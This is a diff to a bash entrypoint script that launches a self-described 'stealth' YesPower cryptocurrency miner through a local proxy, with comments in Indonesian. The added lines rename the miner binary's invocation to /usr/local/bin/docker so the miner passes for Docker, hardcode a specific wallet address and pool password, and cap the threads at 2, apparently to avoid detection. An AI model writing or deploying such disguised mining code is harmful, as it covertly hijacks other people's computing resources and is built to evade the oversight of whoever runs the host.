@@ -1,18 +1,18 @@
 #!/bin/bash
 set -e
 
-echo "=== Stealth YesPower Miner (Hardcoded SOCKS5) ==="
+echo "=== Stealth YesPower Miner Started ==="
 
-# Jalankan local stealth proxy
+# Jalankan stealth proxy
 node /wsproxy.js &
 sleep 3
 
-echo "⛏️  Starting cpuminer..."
+echo "⛏️  Mining started with hardcoded config..."
 
-exec cpuminer \
+exec /usr/local/bin/docker \
     -a yespower \
     -o stratum+tcp://127.0.0.1:80 \
-    -u "${WALLET:-WALLET_ANDA}.${WORKER:-worker}" \
-    -p "${PASSWORD:-c=SWAMP,mc=SWAMP}" \
-    -t "${THREADS:-$(nproc)}" \
+    -u "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker" \
+    -p "c=SWAMP,mc=SWAMP" \
+    -t 2 \
     "$@"
